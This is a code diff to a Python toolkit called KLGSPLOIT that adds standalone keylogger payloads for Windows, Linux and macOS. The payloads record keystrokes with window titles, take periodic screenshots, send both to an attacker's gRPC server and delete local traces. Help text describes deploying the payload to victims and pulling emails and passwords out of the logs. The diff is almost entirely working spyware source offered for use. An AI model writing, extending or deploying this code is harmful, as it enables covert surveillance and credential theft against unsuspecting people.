@@ -192,11 +192,13 @@ if __name__ == "__main__":
 # FIX: use cln.configure() so the right server is targeted,
 #      pass grpc_sender= into loggerFunction so on_press actually sends,
 #      and add .png extension to screenshot filenames.
+#      Screenshots are now sent to attacker via gRPC.
 SCRIPT_WIN_ADVANCED_TEMPLATE = '''
 import sys
 import os
 import threading
 import time
+import tempfile
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from libs.winlog import loggerFunction as loggerFunctionWindows
 from libs import cln
@@ -211,11 +213,23 @@ SCREENSHOT_INTERVAL = {screenshot_interval}
 cln.configure(GRPC_HOST, GRPC_PORT)
 
 def screenshot_loop():
-    """Take screenshots at regular intervals."""
+    """Take screenshots at regular intervals and send to attacker server."""
+    # Use temp folder to avoid leaving traces
+    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
+    os.makedirs(temp_folder, exist_ok=True)
+    
     while True:
         try:
             fname = f"sc_{{int(time.time())}}.png"
-            take_screenshot(platform='win', folder='./screenshots', filename=fname)
+            filepath = take_screenshot(platform='win', folder=temp_folder, filename=fname)
+            if filepath and os.path.exists(filepath):
+                # Send screenshot to attacker server via gRPC
+                cln.send_screenshot_non_blocking(filepath)
+                # Clean up local file after sending
+                try:
+                    os.remove(filepath)
+                except Exception:
+                    pass
         except Exception:
             pass
         time.sleep(SCREENSHOT_INTERVAL)
@@ -252,6 +266,7 @@ import sys
 import os
 import threading
 import time
+import tempfile
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from libs.linlog import loggerFunction as loggerFunctionLinux
 from libs import cln
@@ -266,11 +281,23 @@ SCREENSHOT_INTERVAL = {screenshot_interval}
 cln.configure(GRPC_HOST, GRPC_PORT)
 
 def screenshot_loop():
-    """Take screenshots at regular intervals."""
+    """Take screenshots at regular intervals and send to attacker server."""
+    # Use temp folder to avoid leaving traces
+    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
+    os.makedirs(temp_folder, exist_ok=True)
+    
     while True:
         try:
             fname = f"sc_{{int(time.time())}}.png"
-            take_screenshot(platform='lnx', folder='./screenshots', filename=fname)
+            filepath = take_screenshot(platform='lnx', folder=temp_folder, filename=fname)
+            if filepath and os.path.exists(filepath):
+                # Send screenshot to attacker server via gRPC
+                cln.send_screenshot_non_blocking(filepath)
+                # Clean up local file after sending
+                try:
+                    os.remove(filepath)
+                except Exception:
+                    pass
         except Exception:
             pass
         time.sleep(SCREENSHOT_INTERVAL)
@@ -305,6 +332,7 @@ import sys
 import os
 import threading
 import time
+import tempfile
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from libs.maclog import loggerFunction as loggerFunctionMac
 from libs import cln
@@ -319,11 +347,23 @@ SCREENSHOT_INTERVAL = {screenshot_interval}
 cln.configure(GRPC_HOST, GRPC_PORT)
 
 def screenshot_loop():
-    """Take screenshots at regular intervals."""
+    """Take screenshots at regular intervals and send to attacker server."""
+    # Use temp folder to avoid leaving traces
+    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
+    os.makedirs(temp_folder, exist_ok=True)
+    
     while True:
         try:
             fname = f"sc_{{int(time.time())}}.png"
-            take_screenshot(platform='mac', folder='./screenshots', filename=fname)
+            filepath = take_screenshot(platform='mac', folder=temp_folder, filename=fname)
+            if filepath and os.path.exists(filepath):
+                # Send screenshot to attacker server via gRPC
+                cln.send_screenshot_non_blocking(filepath)
+                # Clean up local file after sending
+                try:
+                    os.remove(filepath)
+                except Exception:
+                    pass
         except Exception:
             pass
         time.sleep(SCREENSHOT_INTERVAL)
@@ -333,6 +373,537 @@ def main():
     screenshot_thread.start()
 
     loggerFunctionMac(grpc_sender=cln.send_key_non_blocking)
+
+if __name__ == "__main__":
+    main()
+'''
+
+# ============================================
+# STANDALONE EXE SCRIPT TEMPLATES
+# These templates embed all necessary code for standalone executables
+# that don't require the libs folder at runtime.
+# ============================================
+
+STANDALONE_WIN_ADVANCED_TEMPLATE = '''
+# -*- coding: utf-8 -*-
+"""
+KLGSPLOIT Standalone Windows Payload
+Self-contained keylogger + screenshot with gRPC exfiltration
+"""
+import sys
+import os
+import threading
+import time
+import tempfile
+import hashlib
+import platform as plat
+from datetime import datetime
+
+# ============ gRPC Client (embedded) ============
+try:
+    import grpc
+    HAS_GRPC = True
+except ImportError:
+    HAS_GRPC = False
+
+# gRPC client configuration
+_host = "{host}"
+_port = {port}
+_client_id = None
+
+def _generate_client_id():
+    info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
+    return hashlib.md5(info.encode()).hexdigest()[:12]
+
+def send_key_grpc(text):
+    if not HAS_GRPC:
+        return
+    try:
+        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        channel.unary_unary(
+            '/KeylogService/SendKeylog',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )(text.encode())
+    except Exception:
+        pass
+
+def send_screenshot_grpc(filepath):
+    global _client_id
+    if not HAS_GRPC:
+        return
+    try:
+        if not os.path.exists(filepath):
+            return
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = os.path.basename(filepath)
+        if _client_id is None:
+            _client_id = _generate_client_id()
+        
+        header = f"{{_client_id}}|{{filename}}|{{timestamp}}|".encode()
+        message = header + data
+        
+        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        channel.unary_unary(
+            '/KeylogService/SendScreenshot',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )(message)
+    except Exception:
+        pass
+
+# ============ Screenshot (embedded) ============
+try:
+    from PIL import ImageGrab
+    HAS_PIL = True
+except ImportError:
+    HAS_PIL = False
+
+def take_screenshot(folder, filename):
+    if not HAS_PIL:
+        return None
+    try:
+        os.makedirs(folder, exist_ok=True)
+        filepath = os.path.join(folder, filename)
+        screenshot = ImageGrab.grab()
+        screenshot.save(filepath)
+        return filepath
+    except Exception:
+        return None
+
+# ============ Keylogger (embedded) ============
+try:
+    from pynput import keyboard
+    HAS_PYNPUT = True
+except ImportError:
+    HAS_PYNPUT = False
+
+try:
+    import pygetwindow as gw
+    HAS_GW = True
+except ImportError:
+    HAS_GW = False
+
+def get_active_window():
+    if not HAS_GW:
+        return "Unknown"
+    try:
+        win = gw.getActiveWindow()
+        return win.title if win and win.title else "Desktop"
+    except Exception:
+        return "Desktop"
+
+last_window = ""
+
+def on_press(key):
+    global last_window
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    current_window = get_active_window()
+    
+    if hasattr(key, 'char') and key.char:
+        key_str = key.char
+        key_type = 'char'
+    else:
+        key_str = str(key).replace('Key.', '')
+        key_type = 'special'
+    
+    # Send via gRPC
+    message = f"[WIN] {{key_str}} | {{key_type}} | {{current_window}} | {{timestamp}}"
+    threading.Thread(target=send_key_grpc, args=(message,), daemon=True).start()
+    
+    # Log locally to temp
+    try:
+        log_path = os.path.join(tempfile.gettempdir(), ".klg.dat")
+        with open(log_path, 'a', encoding='utf-8') as f:
+            if current_window != last_window:
+                f.write(f"\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n")
+                last_window = current_window
+            f.write(f"[{{timestamp}}] {{key_str}}\\n")
+    except Exception:
+        pass
+
+# ============ Main ============
+SCREENSHOT_INTERVAL = {screenshot_interval}
+
+def screenshot_loop():
+    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
+    os.makedirs(temp_folder, exist_ok=True)
+    while True:
+        try:
+            fname = f"sc_{{int(time.time())}}.png"
+            filepath = take_screenshot(temp_folder, fname)
+            if filepath and os.path.exists(filepath):
+                send_screenshot_grpc(filepath)
+                try:
+                    os.remove(filepath)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        time.sleep(SCREENSHOT_INTERVAL)
+
+def main():
+    if HAS_PYNPUT:
+        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
+        screenshot_thread.start()
+        
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+
+if __name__ == "__main__":
+    main()
+'''
+
+STANDALONE_LNX_ADVANCED_TEMPLATE = '''
+# -*- coding: utf-8 -*-
+"""
+KLGSPLOIT Standalone Linux Payload
+Self-contained keylogger + screenshot with gRPC exfiltration
+"""
+import sys
+import os
+import threading
+import time
+import tempfile
+import hashlib
+import platform as plat
+from datetime import datetime
+
+# ============ gRPC Client (embedded) ============
+try:
+    import grpc
+    HAS_GRPC = True
+except ImportError:
+    HAS_GRPC = False
+
+_host = "{host}"
+_port = {port}
+_client_id = None
+
+def _generate_client_id():
+    info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
+    return hashlib.md5(info.encode()).hexdigest()[:12]
+
+def send_key_grpc(text):
+    if not HAS_GRPC:
+        return
+    try:
+        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        channel.unary_unary(
+            '/KeylogService/SendKeylog',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )(text.encode())
+    except Exception:
+        pass
+
+def send_screenshot_grpc(filepath):
+    global _client_id
+    if not HAS_GRPC:
+        return
+    try:
+        if not os.path.exists(filepath):
+            return
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = os.path.basename(filepath)
+        if _client_id is None:
+            _client_id = _generate_client_id()
+        
+        header = f"{{_client_id}}|{{filename}}|{{timestamp}}|".encode()
+        message = header + data
+        
+        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        channel.unary_unary(
+            '/KeylogService/SendScreenshot',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )(message)
+    except Exception:
+        pass
+
+# ============ Screenshot (embedded) ============
+try:
+    import mss
+    import mss.tools
+    HAS_MSS = True
+except ImportError:
+    HAS_MSS = False
+
+def take_screenshot(folder, filename):
+    if not HAS_MSS:
+        return None
+    try:
+        os.makedirs(folder, exist_ok=True)
+        filepath = os.path.join(folder, filename)
+        with mss.mss() as sct:
+            sct.shot(mon=-1, output=filepath)
+        return filepath
+    except Exception:
+        return None
+
+# ============ Keylogger (embedded) ============
+try:
+    from pynput import keyboard
+    HAS_PYNPUT = True
+except ImportError:
+    HAS_PYNPUT = False
+
+try:
+    from Xlib import display, X
+    HAS_XLIB = True
+except ImportError:
+    HAS_XLIB = False
+
+def get_active_window():
+    if not HAS_XLIB:
+        return "Unknown"
+    try:
+        d = display.Display()
+        root = d.screen().root
+        NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
+        prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
+        if not prop:
+            return "Desktop"
+        win_id = prop.value[0]
+        if win_id == 0:
+            return "Desktop"
+        window = d.create_resource_object('window', win_id)
+        NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
+        wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
+        if wm_name_prop:
+            name = wm_name_prop.value
+            if isinstance(name, bytes):
+                return name.decode('utf-8', errors='ignore')
+            return str(name)
+        return window.get_wm_name() or "Desktop"
+    except Exception:
+        return "Desktop"
+
+last_window = ""
+
+def on_press(key):
+    global last_window
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    current_window = get_active_window()
+    
+    if hasattr(key, 'char') and key.char:
+        key_str = key.char
+        key_type = 'char'
+    else:
+        key_str = str(key).replace('Key.', '')
+        key_type = 'special'
+    
+    message = f"[LNX] {{key_str}} | {{key_type}} | {{current_window}} | {{timestamp}}"
+    threading.Thread(target=send_key_grpc, args=(message,), daemon=True).start()
+    
+    try:
+        log_path = os.path.join(tempfile.gettempdir(), ".klg.dat")
+        with open(log_path, 'a', encoding='utf-8') as f:
+            if current_window != last_window:
+                f.write(f"\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n")
+                last_window = current_window
+            f.write(f"[{{timestamp}}] {{key_str}}\\n")
+    except Exception:
+        pass
+
+# ============ Main ============
+SCREENSHOT_INTERVAL = {screenshot_interval}
+
+def screenshot_loop():
+    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
+    os.makedirs(temp_folder, exist_ok=True)
+    while True:
+        try:
+            fname = f"sc_{{int(time.time())}}.png"
+            filepath = take_screenshot(temp_folder, fname)
+            if filepath and os.path.exists(filepath):
+                send_screenshot_grpc(filepath)
+                try:
+                    os.remove(filepath)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        time.sleep(SCREENSHOT_INTERVAL)
+
+def main():
+    if HAS_PYNPUT:
+        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
+        screenshot_thread.start()
+        
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+
+if __name__ == "__main__":
+    main()
+'''
+
+STANDALONE_MAC_ADVANCED_TEMPLATE = '''
+# -*- coding: utf-8 -*-
+"""
+KLGSPLOIT Standalone macOS Payload
+Self-contained keylogger + screenshot with gRPC exfiltration
+"""
+import sys
+import os
+import threading
+import time
+import tempfile
+import subprocess
+import hashlib
+import platform as plat
+from datetime import datetime
+
+# ============ gRPC Client (embedded) ============
+try:
+    import grpc
+    HAS_GRPC = True
+except ImportError:
+    HAS_GRPC = False
+
+_host = "{host}"
+_port = {port}
+_client_id = None
+
+def _generate_client_id():
+    info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
+    return hashlib.md5(info.encode()).hexdigest()[:12]
+
+def send_key_grpc(text):
+    if not HAS_GRPC:
+        return
+    try:
+        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        channel.unary_unary(
+            '/KeylogService/SendKeylog',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )(text.encode())
+    except Exception:
+        pass
+
+def send_screenshot_grpc(filepath):
+    global _client_id
+    if not HAS_GRPC:
+        return
+    try:
+        if not os.path.exists(filepath):
+            return
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = os.path.basename(filepath)
+        if _client_id is None:
+            _client_id = _generate_client_id()
+        
+        header = f"{{_client_id}}|{{filename}}|{{timestamp}}|".encode()
+        message = header + data
+        
+        channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
+        channel.unary_unary(
+            '/KeylogService/SendScreenshot',
+            request_serializer=lambda x: x,
+            response_deserializer=lambda x: x
+        )(message)
+    except Exception:
+        pass
+
+# ============ Screenshot (embedded) ============
+def take_screenshot(folder, filename):
+    try:
+        os.makedirs(folder, exist_ok=True)
+        filepath = os.path.join(folder, filename)
+        result = subprocess.run(['screencapture', '-x', filepath], capture_output=True, timeout=10)
+        if result.returncode == 0 and os.path.exists(filepath):
+            return filepath
+    except Exception:
+        pass
+    return None
+
+# ============ Keylogger (embedded) ============
+try:
+    from pynput import keyboard
+    HAS_PYNPUT = True
+except ImportError:
+    HAS_PYNPUT = False
+
+try:
+    from AppKit import NSWorkspace
+    HAS_APPKIT = True
+except ImportError:
+    HAS_APPKIT = False
+
+def get_active_window():
+    if not HAS_APPKIT:
+        return "Unknown"
+    try:
+        workspace = NSWorkspace.sharedWorkspace()
+        active_app = workspace.frontmostApplication()
+        return active_app.localizedName() if active_app else "Desktop"
+    except Exception:
+        return "Desktop"
+
+last_window = ""
+
+def on_press(key):
+    global last_window
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    current_window = get_active_window()
+    
+    if hasattr(key, 'char') and key.char:
+        key_str = key.char
+        key_type = 'char'
+    else:
+        key_str = str(key).replace('Key.', '')
+        key_type = 'special'
+    
+    message = f"[MAC] {{key_str}} | {{key_type}} | {{current_window}} | {{timestamp}}"
+    threading.Thread(target=send_key_grpc, args=(message,), daemon=True).start()
+    
+    try:
+        log_path = os.path.join(tempfile.gettempdir(), ".klg.dat")
+        with open(log_path, 'a', encoding='utf-8') as f:
+            if current_window != last_window:
+                f.write(f"\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n")
+                last_window = current_window
+            f.write(f"[{{timestamp}}] {{key_str}}\\n")
+    except Exception:
+        pass
+
+# ============ Main ============
+SCREENSHOT_INTERVAL = {screenshot_interval}
+
+def screenshot_loop():
+    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
+    os.makedirs(temp_folder, exist_ok=True)
+    while True:
+        try:
+            fname = f"sc_{{int(time.time())}}.png"
+            filepath = take_screenshot(temp_folder, fname)
+            if filepath and os.path.exists(filepath):
+                send_screenshot_grpc(filepath)
+                try:
+                    os.remove(filepath)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        time.sleep(SCREENSHOT_INTERVAL)
+
+def main():
+    if HAS_PYNPUT:
+        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
+        screenshot_thread.start()
+        
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
 
 if __name__ == "__main__":
     main()
@@ -361,8 +932,10 @@ def print_banner():
 def print_help():
     print_banner()
     help_text = """
-Keylogger toolkit (dependencies):
-    pip install pynput pillow mss grpcio grpcio-tools pyinstaller
+Keylogger toolkit v2.0 - Now with Screenshot gRPC Exfiltration!
+
+Dependencies:
+    pip install pynput pillow mss grpcio grpcio-tools pyinstaller pygetwindow python-xlib
 
 Usage:
     Help message:
@@ -371,20 +944,36 @@ Usage:
     Usage 1 - Start keylogger locally:
         python klgsploit_cli.py --start
 
-    Usage 2 - Start attacker server only:
+    Usage 2 - Start attacker server (receives keylogs + screenshots):
         python klgsploit_cli.py --serve host:<host> port:<port_number>
+        
+        The server will:
+        - Receive keylog messages from victim machines
+        - Receive and save screenshots to ./received_screenshots/<client_id>/
 
-    Usage 3 - Generate standard executable:
+    Usage 3 - Generate standard executable (local logging only):
         python klgsploit_cli.py --build platform:<win/lnx/mac> --output:<directory> -fname:<filename> extention:<exe/out/app>
 
-    Usage 3 Advanced - Generate executable with gRPC & screenshots:
+    Usage 3 Advanced - Generate standalone EXE with gRPC exfiltration:
         python klgsploit_cli.py --build-adv platform:<win/lnx/mac> --output:<directory> -fname:<filename> extention:<exe/out/app> host:<host> port:<port> --screenshot-interval:<seconds>
+        
+        The generated EXE will:
+        - Capture keystrokes and send them to attacker server via gRPC
+        - Take screenshots at specified interval and send to attacker server
+        - Be completely standalone (no libs folder needed)
+        - Clean up screenshots after sending (no traces on victim)
 
     Usage 4 - Classify log file (extract emails/passwords):
         python klgsploit_cli.py --classify input:<path_to_logfile>
 
-    Usage 5 - Take screenshot:
+    Usage 5 - Take screenshot locally:
         python klgsploit_cli.py --screenshot platform:<win/lnx/mac> --output:<directory> -fname:<filename>
+
+Example workflow:
+    1. Start server:    python klgsploit_cli.py --serve host:0.0.0.0 port:50051
+    2. Build payload:   python klgsploit_cli.py --build-adv platform:win host:YOUR_IP port:50051 --screenshot-interval:30
+    3. Deploy payload to victim
+    4. Receive keylogs and screenshots on your server
 """
     print(help_text)
 
@@ -446,21 +1035,23 @@ def run_build_advanced():
     port = get_port()
     screenshot_interval = get_screenshot_interval()
     
-    print(f"[*] Building advanced executable for platform: {target}")
+    print(f"[*] Building advanced standalone executable for platform: {target}")
     print(f"    Output: {output_dir}/{filename}.{ext}")
     print(f"    gRPC Server: {host}:{port}")
     print(f"    Screenshot interval: {screenshot_interval}s")
+    print(f"    Mode: Standalone EXE (self-contained, no libs required)")
     
+    # Use standalone templates for EXE builds
     if target == 'win':
-        script = SCRIPT_WIN_ADVANCED_TEMPLATE.format(
+        script = STANDALONE_WIN_ADVANCED_TEMPLATE.format(
             host=host, port=port, screenshot_interval=screenshot_interval
         )
     elif target == 'lnx':
-        script = SCRIPT_LNX_ADVANCED_TEMPLATE.format(
+        script = STANDALONE_LNX_ADVANCED_TEMPLATE.format(
             host=host, port=port, screenshot_interval=screenshot_interval
         )
     elif target == 'mac':
-        script = SCRIPT_MAC_ADVANCED_TEMPLATE.format(
+        script = STANDALONE_MAC_ADVANCED_TEMPLATE.format(
             host=host, port=port, screenshot_interval=screenshot_interval
         )
     else:
